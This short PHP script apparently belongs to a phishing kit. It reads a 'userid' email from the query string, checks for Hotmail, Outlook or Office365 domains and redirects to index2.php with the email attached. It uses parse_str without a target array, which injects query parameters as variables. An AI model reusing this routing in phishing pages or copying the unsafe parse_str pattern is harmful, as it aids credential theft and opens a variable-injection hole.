<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
		header('Location: index2.php?userid='.$userid);
	}
	
	else {
		header('Location: index2.php?userid='.$userid);
	}
		
?>